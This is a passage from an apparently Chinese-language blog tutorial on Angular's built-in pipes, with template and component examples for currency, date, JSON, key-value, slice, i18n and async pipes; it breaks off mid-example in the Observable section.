</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><blockquote><p>PercentPipe</p></blockquote> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token punctuation">{</span><span class="token punctuation">{</span> <span class="token operator">-</span><span class="token number">0.5052338914680037</span> <span class="token operator">|</span> percent<span class="token operator">:</span><span class="token string">'2.0-3'</span> <span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token comment">// -50.523％</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><blockquote><p>CurrencyPipe</p></blockquote> <p>number_expression | currency[:currencyCode[:symbolDisplay[:digitInfo]]]</p> <ul><li>currencyCode 就是ISO 4217货币编码，比如USD代表美元，EUR代表欧元，CNY或RMB代表人民币。</li> <li>symbolDisplay 是一个布尔值，它表示渲染的时候是否显示货币单位还是ISO 4217货币编码</li> <li>true:显示符号如$,</li> <li>false:是默认值会显示货币编码，比如USD.</li> <li>digitInfo:和Decimalpipe一样。</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token number">123</span> <span class="token operator">|</span> currency <span class="token punctuation">}</span><span class="token punctuation">}</span>  <span class="token comment">//$123</span>
<span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token number">123</span> <span class="token operator">|</span> currency<span class="token operator">:</span><span class="token string">'￥'</span> <span class="token punctuation">}</span><span class="token punctuation">}</span>  <span class="token comment">//￥123</span>
<span class="token operator">&lt;</span>p<span class="token operator">&gt;</span><span class="token punctuation">{</span><span class="token punctuation">{</span>a <span class="token operator">|</span> currency<span class="token operator">:</span><span class="token string">'USD'</span><span class="token operator">:</span><span class="token boolean">false</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">&gt;</span>   <span class="token comment">// a:number = 8.2515</span>
<span class="token operator">&lt;</span>p<span class="token operator">&gt;</span><span class="token punctuation">{</span><span class="token punctuation">{</span>b <span class="token operator">|</span> currency<span class="token operator">:</span><span class="token string">'USD'</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token operator">:</span><span class="token string">'4.2-2'</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">&gt;</span>   <span class="token comment">//  b:number = 156.548</span>
<span class="token punctuation">{</span><span class="token punctuation">{</span>currency<span class="token operator">:</span><span class="token string">'RMB'</span><span class="token operator">:</span><span class="token string">'symbol-narrow'</span><span class="token operator">:</span><span class="token string">'4.2-2'</span><span class="token punctuation">}</span><span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p>USD是美元UnitedStatesdollar的缩写，当为false时不显示符，当为true时，则显示$符。后面的规定小数位数。</p> <p>2.x - 4.x版本里（5.x以上已经可以自动识别），在使用货币管道处理人民币之前，应先对Angular进行一些本地化的工作。否则会显示CN￥，不应该是￥。</p> <p>在你的app module中：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span> <span class="token constant">LOCALE_ID</span> <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
@<span class="token function">NgModule</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  providers<span class="token operator">:</span> <span class="token punctuation">[</span>
    <span class="token punctuation">{</span> provide<span class="token operator">:</span> <span class="token constant">LOCALE_ID</span><span class="token punctuation">,</span> useValue<span class="token operator">:</span> <span class="token string">&quot;ch-CN&quot;</span> <span class="token punctuation">}</span>
  <span class="token punctuation">]</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><div class="custom-block tip"><p class="custom-block-title">温馨提示</p> <p>第三个参数接受'symbol-narrow'显示符号和'symbol'显示字母。
可以直接用true和false代替，注意使用true和false时是boolean值，不带引号</p></div> <blockquote><p>JsonPipe</p></blockquote> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code> <span class="token operator">&lt;</span>p<span class="token operator">&gt;</span><span class="token punctuation">{</span><span class="token punctuation">{</span> <span class="token punctuation">{</span> name<span class="token operator">:</span> <span class="token string">'semlinker'</span> <span class="token punctuation">}</span> <span class="token operator">|</span> json <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">&gt;</span> <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> Output<span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token string">&quot;name&quot;</span><span class="token operator">:</span> <span class="token string">&quot;semlinker&quot;</span> <span class="token punctuation">}</span> <span class="token operator">--</span><span class="token operator">&gt;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><blockquote><p>DatePipe</p></blockquote> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token operator">&lt;</span>p<span class="token operator">&gt;</span><span class="token punctuation">{</span><span class="token punctuation">{</span> today <span class="token operator">|</span> date<span class="token operator">:</span> <span class="token string">'shortTime'</span> <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">&gt;</span> <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> Output<span class="token operator">:</span> 以当前时间为准，输出格式：<span class="token number">10</span><span class="token operator">:</span><span class="token number">40</span> <span class="token constant">AM</span> <span class="token operator">--</span><span class="token operator">&gt;</span>
<span class="token punctuation">{</span><span class="token punctuation">{</span>today <span class="token operator">|</span> date<span class="token operator">:</span><span class="token string">'yyyy-MM-dd HH:mm:ss'</span> <span class="token punctuation">}</span><span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>事实上，angular管道同时可以在ts逻辑钟使用，比如：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span> DatePipe <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/common'</span><span class="token punctuation">;</span>
@<span class="token function">Injectable</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">MyLessonsStoreService</span> <span class="token keyword">extends</span> <span class="token class-name">ComponentStore</span><span class="token operator">&lt;</span>IMyLessonsState<span class="token operator">&gt;</span> <span class="token punctuation">{</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter"><span class="token keyword">private</span> learningCenterApiSrv<span class="token operator">:</span> LearningCernterApiService<span class="token punctuation">,</span> <span class="token keyword">private</span> datePipe<span class="token operator">:</span> DatePipe</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
      prevSelectDate<span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">,</span>
      selectDate<span class="token operator">:</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
      loading<span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
      calendarLoading<span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
      monthLessonList<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
      todayClassTimeList<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
      telephone<span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>learningCenterApiSrv<span class="token punctuation">.</span>telephone
    <span class="token punctuation">}</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span>
 readonly isLessonDay <span class="token operator">=</span> <span class="token punctuation">(</span>date<span class="token operator">:</span> Date<span class="token punctuation">,</span> dateSource<span class="token operator">:</span> string<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token parameter">boolean</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> dateStr <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>datePipe<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span>date<span class="token punctuation">,</span> <span class="token string">'YYYY-MM-dd'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">&lt;</span><span class="token operator">--</span><span class="token operator">--</span>实现日期转换
    <span class="token keyword">return</span> dateSource<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>dateStr<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br></div></div><blockquote><p>KeyValuePipe</p></blockquote> <p>自 6.1.0-beta.1 版本开始，Angular 新增了 KeyValuePipe 管道，用于将对象转换为键值对，从而能够遍历对象内容。用法为：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> object <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">2</span><span class="token operator">:</span> <span class="token string">'foo'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token operator">:</span> <span class="token string">'bar'</span><span class="token punctuation">}</span> <span class="token operator">--</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>div <span class="token operator">*</span>ngFor<span class="token operator">=</span><span class="token string">&quot;let item of object | keyvalue&quot;</span><span class="token operator">&gt;</span>
  <span class="token punctuation">{</span><span class="token punctuation">{</span>item<span class="token punctuation">.</span>key<span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token punctuation">{</span>item<span class="token punctuation">.</span>value<span class="token punctuation">}</span><span class="token punctuation">}</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>另外也可以额外接受一个比较函数用于自定义排序：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> <span class="token function-variable function">compareFn</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">a<span class="token operator">:</span> KeyValue<span class="token operator">&lt;</span>number<span class="token punctuation">,</span> string<span class="token operator">&gt;</span><span class="token punctuation">,</span> b<span class="token operator">:</span> KeyValue<span class="token operator">&lt;</span>number<span class="token punctuation">,</span> string<span class="token operator">&gt;</span></span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> a<span class="token punctuation">.</span>key <span class="token operator">-</span> b<span class="token punctuation">.</span>key <span class="token operator">--</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>div <span class="token operator">*</span>ngFor<span class="token operator">=</span><span class="token string">&quot;let item of object | keyvalue:compareFn&quot;</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>由于对象属性本身不具备顺序，为了保证不同环境下的结果一致性，KeyValuePipe 会强制排序，在不使用自定义排序函数的情况下，将使用数值升序或字典序尽心排列。</p> <p>需要特别注意的是，由于对象的可变性，KeyValuePipe 并不是一个 pure 的 Pipe。其中的处理过程会在每次 Change Detection 中重新执行，用于大量数据中可能会产生严重的性能问题。因此并不建议使用该管道，除非有清晰的数据流控制。</p> <blockquote><p>SlicePipe</p></blockquote> <p>从一个 Array 或 String 中创建其元素一个新子集（slice）。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token punctuation">{</span><span class="token punctuation">{</span> <span class="token string">'semlinker'</span> <span class="token operator">|</span> slice<span class="token operator">:</span><span class="token number">0</span><span class="token operator">:</span><span class="token number">3</span> <span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token comment">//显示结果 Output: sem</span>

@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">'slice-string-pipe'</span><span class="token punctuation">,</span>
  template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;div&gt;
    &lt;p&gt;'{{str | slice:0:4}}' - 截取0-4，最终输出 'abcd'&lt;/p&gt;
    &lt;p&gt;'{{str | slice:4:0}}' - 最终输出 ''&lt;/p&gt;
    &lt;p&gt;'{{str | slice:-4}}' - 从倒数第四开始截取，最终输出 'ghij'&lt;/p&gt;
    &lt;p&gt;'{{str | slice:-4:-2}}' - 从倒数第四道倒数第二，最终输出 'gh'&lt;/p&gt;
    &lt;p&gt;'{{str | slice:-100}}' - 从倒数100位开始，最终输出 'abcdefghij'&lt;/p&gt;
    &lt;p&gt;'{{str | slice:100}}' - 从100位开始，最终输出 ''&lt;/p&gt;
  &lt;/div&gt;</span><span class="token template-punctuation string">`</span></span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">SlicePipeStringComponent</span> <span class="token punctuation">{</span>
  str<span class="token operator">:</span> string <span class="token operator">=</span> <span class="token string">'abcdefghij'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br></div></div><blockquote><p>I18nPluralPipe</p></blockquote> <p>I18n复数管道,I18nPluralPipe 过滤的参数是一个数值，然后选择根据条件转化。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">'i18n-plural-pipe'</span><span class="token punctuation">,</span>
  template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;div&gt;{{ messages.length | i18nPlural: messageMapping }}&lt;/div&gt;</span><span class="token template-punctuation string">`</span></span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">I18nPluralPipeComponent</span> <span class="token punctuation">{</span>
  messages<span class="token operator">:</span> any<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'Message 1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  messageMapping<span class="token operator">:</span>
      <span class="token punctuation">{</span><span class="token punctuation">[</span>k<span class="token operator">:</span> string<span class="token punctuation">]</span><span class="token operator">:</span> string<span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'=0'</span><span class="token operator">:</span> <span class="token string">'No messages.'</span><span class="token punctuation">,</span> <span class="token string">'=1'</span><span class="token operator">:</span> <span class="token string">'One message.'</span><span class="token punctuation">,</span> <span class="token string">'other'</span><span class="token operator">:</span> <span class="token string">'# messages.'</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><p>从上面的例子中可以看出messages.length | i18nPlural: messageMapping中的messages.length是一个数值。messageMapping定义了三个条件。</p> <blockquote><p>I18nSelectPipe</p></blockquote> <div class="language-js line-numbers-mode"><pre class="language-js"><code>@<span class="token function">Component</span><span class="token punctuation">(</span>
    <span class="token punctuation">{</span>selector<span class="token operator">:</span> <span class="token string">'i18n-select-pipe'</span><span class="token punctuation">,</span> template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;div&gt;{{gender | i18nSelect: inviteMap}} &lt;/div&gt;</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">I18nSelectPipeComponent</span> <span class="token punctuation">{</span>
  gender<span class="token operator">:</span> string <span class="token operator">=</span> <span class="token string">'male'</span><span class="token punctuation">;</span>
  inviteMap<span class="token operator">:</span> any <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'male'</span><span class="token operator">:</span> <span class="token string">'Invite him.'</span><span class="token punctuation">,</span> <span class="token string">'female'</span><span class="token operator">:</span> <span class="token string">'Invite her.'</span><span class="token punctuation">,</span> <span class="token string">'other'</span><span class="token operator">:</span> <span class="token string">'Invite them.'</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><blockquote><p>AsyncPipe</p></blockquote> <p>使用 AsyncPipe 我们可以直接在模板中使用 Promise 和 Observable 对象，而不用通过定义一个类的成员属性来存储返回的结果</p> <p>AsyncPipe 订阅一个 Observable 或 Promise 对象，并返回它发出的最新值。 当发出新值时，异步管道会主动调用变化检测器的 markForCheck() 方法，标识组件需执行变化检测。 当组件被销毁时，异步管道自动取消订阅，以避免潜在的内存泄漏。</p> <ul><li>Promise 未使用 AsyncPipe</li></ul> <p>promise.component.ts</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span> Component <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
    selector<span class="token operator">:</span> <span class="token string">'exe-promise'</span><span class="token punctuation">,</span>
    template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
     &lt;h4&gt;Promise Component&lt;/h4&gt;
     &lt;p&gt;{{promiseData}}&lt;/p&gt;
    </span><span class="token template-punctuation string">`</span></span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">PromiseComponent</span> <span class="token punctuation">{</span>
    promiseData<span class="token operator">:</span> string<span class="token punctuation">;</span>

    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getPromise</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">v</span> <span class="token operator">=&gt;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>promiseData <span class="token operator">=</span> v<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token function">getPromise</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> Promise<span class="token operator">&lt;</span>string<span class="token operator">&gt;</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
            <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
                <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token string">'Promise complete!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br></div></div><p>app.component.ts</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span> Component <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
selector<span class="token operator">:</span> <span class="token string">'exe-app'</span><span class="token punctuation">,</span>
template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
 &lt;exe-promise&gt;&lt;/exe-promise&gt;
</span><span class="token template-punctuation string">`</span></span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">AppComponent</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><p>以上代码运行后浏览器显示的结果：</p> <center><img src="/vuebloger/img/post/4145472107-58cf547b2b6ee_fix732.png"></center> <ul><li>Promise 使用 AsyncPipe</li></ul> <p>promise-async-pipe.component.ts</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span> Component <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
    selector<span class="token operator">:</span> <span class="token string">'exe-promise-pipe'</span><span class="token punctuation">,</span>
    template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
     &lt;h4&gt;Promise with AsyncPipeComponent&lt;/h4&gt;
     &lt;p&gt;{{ promise | async }}&lt;/p&gt;
    </span><span class="token template-punctuation string">`</span></span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">PromiseAsyncPipeComponent</span> <span class="token punctuation">{</span>
    promise<span class="token operator">:</span> Promise<span class="token operator">&lt;</span>string<span class="token operator">&gt;</span><span class="token punctuation">;</span>
    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
       <span class="token keyword">this</span><span class="token punctuation">.</span>promise <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getPromise</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token function">getPromise</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> Promise<span class="token operator">&lt;</span>string<span class="token operator">&gt;</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
            <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
                <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token string">'Promise with AsyncPipe complete!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br></div></div><p>app.component.ts</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span> Component <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">'exe-app'</span><span class="token punctuation">,</span>
  template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
   &lt;exe-promise-pipe&gt;&lt;/exe-promise-pipe&gt;
  </span><span class="token template-punctuation string">`</span></span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">AppComponent</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><p>以上代码运行后浏览器显示的结果：</p> <center><img src="/vuebloger/img/post/1828949498-58cf549017131_fix732.png"></center> <ul><li>Observable 未使用 AsyncPipe</li></ul> <p>observable.component.ts</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span> Observable<span class="token punctuation">,</span> Subscription <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'rxjs/Rx'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> Component<span class="token punctuation">,</span> OnDestroy <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>

@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
    selector<span class="token operator">:</span> <span class="token string">'exe-observable'</span><span class="token punctuation">,</span>
    template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
     &lt;h4&gt;Observable Component&lt;/h4&gt;
     &lt;p&gt;{{ observableData }}&lt;/p&gt;
    </span><span class="token template-punctuation string">`</span></span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">ObservableComponent</span> <span class="token keyword">implements</span> <span class="token class-name">OnDestroy</span> <span class="token punctuation">{</span>
    observableData<span class="token operator">:</span> number<span class="token punctuation">;</span>
    subscription<span class="token operator">:</span> Subscription <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">subscribeObservable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token function">getObservable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> Observable<span class="token operator">&lt;</span>number<span class="token operator">&gt;</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> Observable
            <span class="token punctuation">.</span><span class="token function">interval</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span> <span class="token comment">// 每隔1秒，生成一个值</span>
